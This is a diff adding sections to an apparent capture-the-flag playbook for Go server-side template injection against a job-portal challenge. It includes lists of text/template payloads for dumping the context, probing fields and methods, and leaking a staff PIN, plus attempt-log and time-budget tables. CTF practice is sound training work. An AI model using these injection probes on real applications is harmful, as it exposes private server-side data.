@@ -211,6 +211,90 @@ Read whatever error text comes back carefully — Go template errors often inclu
 
 ---
 
+## 5.6. Terminal input gotchas
+
+Before you conclude a branch "doesn't work," rule out your own terminal mangling the input:
+
+| Symptom | Likely cause | Fix |
+|---|---|---|
+| `{{` or `}}` seems to vanish or only one brace shows | Some terminal emulators / SSH clients treat `{` as a readline or shell-expansion character in certain modes | Type slowly, or paste instead of typing live, and watch the line as you go |
+| Quotes (`"`) inside the filter get smart-quoted or stripped | Terminal or OS autocorrect (common on phones/some SSH apps) | Use a plain terminal app, disable autocorrect/smart punctuation if on mobile |
+| `$` in `{{range $k, $v := .}}` triggers shell variable behavior | You're not actually inside a shell here (it's the portal's own input box), but some SSH clients still intercept `$` for local line editing | Try typing it directly in the portal's filter field, not at a shell prompt |
+| Backspace/arrow keys show garbage (`^[[D` etc.) | Terminal type mismatch | Set `TERM=xterm-256color` before `ssh`, or try a different terminal app |
+| Nothing happens at all when hitting enter | The portal may require a specific keybinding to submit the filter vs. just typing | Re-check Image 1's footer: `enter apply  esc clear  q quit` — confirm you're pressing the right key for "submit" vs "clear" |
+
+If a given input *looks* identical across two attempts but gives different results, suspect hidden whitespace or a dropped character — retype it character by character rather than relying on terminal history/up-arrow.
+
+---
+
+## Branch I — Built-in Go template functions and method calls
+
+This is the branch most likely to actually break something open if A–H stall. `text/template` (as opposed to `html/template`) has **no output escaping and no sandboxing** — if the portal is using `text/template`, and the context object has any methods (not just fields), you may be able to call them directly. This is the real "nuclear option" of Go SSTI.
+
+### I.1 — Built-in functions (always available in `text/template`)
+```
+{{index .Postings 0}}
+{{index . "Role"}}
+{{and .Role "x"}}
+{{or .Role "default"}}
+{{not .Role}}
+{{eq .Role "guest"}}
+{{len .}}
+{{print .}}
+{{println .}}
+```
+`index` is worth prioritizing — `{{index . "FieldName"}}` sometimes works even when `{{.FieldName}}` doesn't, depending on whether the context is a struct or a map, and it lets you probe field names as *strings* rather than guessing Go-identifier casing.
+
+### I.2 — Method calls (if the context type has methods, not just fields)
+```
+{{.IsStaff}}
+{{.HasAccess}}
+{{.CheckRole}}
+{{.GetNote}}
+{{.String}}
+```
+In Go templates, `{{.Foo}}` works identically whether `Foo` is a struct field *or* a zero-argument method — so every guess in Branch B is implicitly also a method-call attempt. No separate syntax needed, just keep guessing verb-shaped names here (`Get...`, `Is...`, `Has...`, `Check...`) in addition to noun-shaped field names.
+
+### I.3 — `call` for function-valued fields (long shot, but cheap to try)
+```
+{{call .Func}}
+{{call .Authorize "staff"}}
+```
+Only works if a field literally holds a function value — unlikely, but a single-line, zero-risk thing to try once.
+
+### I.4 — Comparison chains (useful once you know `.Role` is a string)
+```
+{{if or (eq .Role "guest") (eq .Role "")}}DEFAULT{{else}}{{.Role}}{{end}}
+```
+Occasionally reveals that `.Role` has a value you haven't guessed yet (not `guest`, not empty, something else) by process of elimination through the `else` branch.
+
+---
+
+## 7. Attempt log (copy this table into your notes and fill it in)
+
+| # | Branch | Input | Output (short) | Notes |
+|---|---|---|---|---|
+| 001 | A | `{{.}}` | | |
+| 002 | A | `{{.Role}}` | | |
+| 003 | | | | |
+
+Keep numbering sequentially across the whole session, even across branches — it's the only way to be sure you haven't repeated an attempt and gotten confused about what you've already ruled out.
+
+---
+
+## 8. Time budget — when to cut a branch
+
+You have unlimited time (nonce doesn't expire), but your own attention doesn't. Rough guide:
+
+| If you've spent... | And seen... | Then... |
+|---|---|---|
+| ~10 inputs on Branch A | Nothing but "no posting match" every time, including `{{.}}` and `{{.Role}}` | Template injection is probably not reachable from this box — move to Section 4 (fallback, non-template approaches) |
+| ~20 inputs on Branch B | `.Role` works but every other guess errors or does nothing | Switch to Branch D (`range`/map dumps) instead of continuing to guess names one at a time — it's more efficient |
+| Any clean full-context dump (`{{.}}` or `{{range $k,$v := .}}`) succeeds | A big blob of text | Stop guessing entirely — just read the blob carefully for anything PIN/note/staff-shaped. This is almost certainly faster than any further guessing. |
+| Branch I method-call guesses all fail | Nothing but errors | You've likely exhausted the template-injection angle for now — re-screenshot the top-right corner and job postings in case something changed, and revisit Section 4 |
+
+---
+
 ## 6. When you find the note
 
 Flag format: `tribectf{PIN}` — the PIN is whatever value sits in the staff onboarding note. Grab the exact text/number, don't paraphrase it.
